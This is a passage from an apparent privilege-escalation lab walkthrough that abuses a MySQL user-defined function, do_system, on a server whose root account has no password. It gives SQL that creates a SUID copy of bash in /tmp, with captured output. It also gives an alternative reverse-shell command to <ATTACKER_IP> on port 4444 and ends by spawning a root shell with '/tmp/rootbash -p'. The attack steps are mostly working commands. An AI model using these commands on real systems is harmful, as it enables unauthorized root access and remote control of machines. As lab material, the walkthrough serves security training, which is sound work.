## Step 4 — Connect to MySQL (No Password)

```bash

```

> [!NOTE]
> The MySQL `root` account has no password — a common misconfiguration. MySQL `root` ≠ Linux `root`, but the MySQL **daemon** runs as Linux root.

## Step 6 — Execute System Commands as Root

### Method 1: Create SUID Rootbash

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

```
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.01 sec)
```

| Command | Meaning |
|---|---|
| `cp /bin/bash /tmp/rootbash` | Copies Bash to a new location |
| `chmod +xs /tmp/rootbash` | Sets SUID and executable permissions |

### Method 2: Reverse Shell (Alternative)

```sql
select do_system('bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1');
```

## Step 7 — Get Root Shell

Exit MySQL (`exit` or `\q`) and execute the SUID bash:

```bash
/tmp/rootbash -p
```

The `-p` flag tells Bash to **preserve its effective privileges** rather than dropping them.

```
mysql> exit
Bye
user@debian:~/tools/mysql-udf$ /tmp/rootbash -p

rootbash-4.1#
```

✅ **Root achieved!** — `euid=0(root)`
